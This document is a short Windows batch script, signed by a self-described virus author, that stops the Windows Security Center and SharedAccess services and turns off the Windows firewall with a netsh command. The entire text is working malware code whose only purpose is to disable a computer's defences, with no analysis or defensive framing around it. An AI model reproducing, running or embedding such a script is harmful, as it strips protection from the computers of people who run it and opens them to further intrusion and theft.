@ echo off
rem ---------------------------------
rem Disable Windows Security
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
rem ---------------------------------


__-Virus Author: subhojit-__